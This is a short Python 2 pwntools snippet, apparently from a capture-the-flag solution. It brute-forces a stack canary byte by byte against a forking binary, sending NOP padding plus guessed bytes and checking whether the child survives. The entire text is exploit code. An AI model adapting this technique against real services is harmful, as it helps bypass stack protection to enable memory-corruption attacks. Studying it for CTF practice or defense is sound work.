canary brute-force

canary = '\x00'
buf = p8(0x90)*0x20

def get_canary():
    global canary
    for _ in range(3):
        log.info("byte_%d"%_)
        for i in range(0xff):
            p.recvuntil("FEED ME!\n")
            len_byte = len(buf) + len(canary) + 1
            p.send(chr(len_byte)+buf + canary + chr(i))
            res = p.recvuntil('Child exit.\n')
            if 'YUM' in res:
                canary += chr(i)
                log.info("canary: "+canary.encode('hex'))
                break
    print hexdump(canary)
